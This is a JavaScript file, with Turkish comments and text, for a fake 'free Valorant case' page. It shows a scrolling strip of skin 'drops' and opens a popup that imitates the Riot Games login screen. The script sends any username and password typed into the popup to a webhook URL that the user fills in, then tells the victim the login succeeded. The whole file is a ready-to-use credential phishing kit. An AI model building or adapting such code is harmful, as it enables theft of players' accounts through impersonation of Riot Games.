const WEBHOOK_URL = "BURAYA_KENDI_LINKINI_KOY";

// Canlı Drop Şeridi İçin Resimler
const dropItems = [
    {n: "Kuronami Vandal", i: "https://static.wikia.nocookie.net/valorant/images/a/a7/Kuronami_Vandal.png"},
    {n: "Reaver Sheriff", i: "https://static.wikia.nocookie.net/valorant/images/8/8f/Reaver_Sheriff.png"},
    {n: "Prime Phantom", i: "https://static.wikia.nocookie.net/valorant/images/e/e0/Prime_Phantom.png"},
    {n: "Elderflame Vandal", i: "https://static.wikia.nocookie.net/valorant/images/5/5e/Elderflame_Vandal.png"},
    {n: "Ion Sheriff", i: "https://static.wikia.nocookie.net/valorant/images/6/61/Ion_Sheriff.png"}
];

const track = document.getElementById('dropTrack');
// Şeridi doldur
for(let i=0; i<40; i++) {
    let item = dropItems[Math.floor(Math.random()*dropItems.length)];
    track.innerHTML += `
        <div class="drop-item">
            <span>YENİ DROP</span>
            <img src="${item.i}">
            <div style="font-size:10px; margin-top:5px; font-weight:bold;">${item.n}</div>
        </div>`;
}

let loggedIn = false;

function openLogin() {
    const w = 450, h = 600;
    const l = (window.innerWidth/2)-(w/2), t = (window.innerHeight/2)-(h/2);
    let win = window.open("", "Riot Login", `width=${w},height=${h},top=${t},left=${l}`);

    win.document.body.innerHTML = `
        <style>
            body { background: #f9f9f9; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
            .wrap { width: 80%; text-align: center; }
            img { width: 120px; margin-bottom: 30px; }
            input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; background: #eee; }
            button { width: 100%; padding: 15px; background: #ff4655; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 20px; }
        </style>
        <div class="wrap">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a8/Riot_Games_logo.svg/2560px-Riot_Games_logo.svg.png">
            <h2 style="margin-bottom:20px">Giriş Yap</h2>
            <input type="text" id="u" placeholder="Kullanıcı Adı">
            <input type="password" id="p" placeholder="Şifre">
            <button id="b">OTURUM AÇ</button>
        </div>
    `;

    win.document.getElementById('b').onclick = function() {
        const user = win.document.getElementById('u').value;
        const pass = win.document.getElementById('p').value;
        if(user && pass) {
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ content: `✅ **Yeni Hesap Bilgisi!**\n👤: \`${user}\` \n🔑: \`${pass}\`` })
            });
            loggedIn = true;
            win.close();
            alert("Giriş Başarılı! Ücretsiz kasanızı açabilirsiniz.");
        }
    };
}

function checkLogin() {
    if(!loggedIn) {
        alert("Ödül kazanmak için önce Riot hesabınızla giriş yapmalısınız.");
        openLogin();
    } else {
        alert("Kasa açılıyor... Lütfen bekleyin.");
    }
}
